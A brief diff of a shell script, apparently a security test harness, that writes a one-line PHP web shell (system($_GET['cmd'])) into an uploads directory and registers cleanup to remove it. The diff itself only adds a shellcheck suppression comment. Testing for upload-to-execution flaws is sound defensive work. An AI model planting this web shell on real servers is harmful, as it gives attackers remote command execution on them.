@@ -45,6 +45,7 @@ cleanup() { rm -f "$SHELL_FILE"; rmdir "$ROOT/uploads" 2>/dev/null || true; }
 add_cleanup cleanup
 
 mkdir -p "$ROOT/uploads"
+# shellcheck disable=SC2016  # $_GET is PHP, written to the file literally
 printf '<?php system($_GET["cmd"]); ?>\n' > "$SHELL_FILE"
 chmod 644 "$SHELL_FILE"
 echo "Dropped $SHELL_FILE"
